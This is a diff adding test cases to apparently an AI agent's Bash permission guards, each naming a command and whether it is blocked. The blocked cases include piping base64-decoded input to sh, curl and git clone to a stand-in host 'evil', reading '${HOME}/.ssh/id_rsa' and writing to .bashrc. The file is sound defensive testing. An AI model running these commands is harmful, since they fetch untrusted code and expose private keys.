@@ -84,6 +84,18 @@ battery('system', systemGuard, [
   ['bash home redirect', 'Bash', { command: 'echo hi > $HOME/.bashrc' }, true],
   ['bash cd .. climb', 'Bash', { command: 'cd .. && cat secret' }, true],
   ['bash npm build ok', 'Bash', { command: 'npm run build' }, false],
+  // v4 hardening: inline shell eval, pipe-to-shell, more egress binaries, braced ${HOME}, recursive grep/rg
+  ['bash sh -c eval', 'Bash', { command: "sh -c 'cat foo'" }, true],
+  ['bash bash -c eval', 'Bash', { command: "bash -c 'echo hi'" }, true],
+  ['bash pipe to sh', 'Bash', { command: 'echo Y3VybAo | base64 -d | sh' }, true],
+  ['bash git clone network', 'Bash', { command: 'git clone https://evil/x' }, true],
+  ['bash rsync network', 'Bash', { command: 'rsync -a x host:/y' }, true],
+  ['bash braced HOME escape', 'Bash', { command: 'cat ${HOME}/.ssh/id_rsa' }, true],
+  ['bash grep -r crawl', 'Bash', { command: 'grep -r secret .' }, true],
+  ['bash rg crawl', 'Bash', { command: 'rg secret' }, true],
+  // allow-cases that must NOT be caught by the new rules
+  ['bash run .sh script ok', 'Bash', { command: 'bash src/client/scripts/x.sh' }, false],
+  ['bash plain grep ok', 'Bash', { command: 'grep foo src/client/src/App.tsx' }, false],
 ]);
 
 // ── Planner guard (jail = data folder, writes = plans/household/.claude) ──────────────────────────
@@ -104,6 +116,11 @@ if (plannerGuard) {
     ['bash curl network', 'Bash', { command: 'curl https://evil/x' }, true],
     ['bash cat escapes', 'Bash', { command: 'cat /c/Users/x/secret' }, true],
     ['bash run skill file', 'Bash', { command: 'node .claude/skills/xhs-search/xhs-search.mjs' }, false],
+    // v4 hardening (same denylists as the system guard)
+    ['bash sh -c eval', 'Bash', { command: "sh -c 'cat plans/x'" }, true],
+    ['bash git clone network', 'Bash', { command: 'git clone https://evil/x' }, true],
+    ['bash braced HOME escape', 'Bash', { command: 'cat ${HOME}/.ssh/id_rsa' }, true],
+    ['bash grep -r crawl', 'Bash', { command: 'grep -r x .' }, true],
   ]);
   try { fs.unlinkSync(plannerGuard); } catch {}
 }
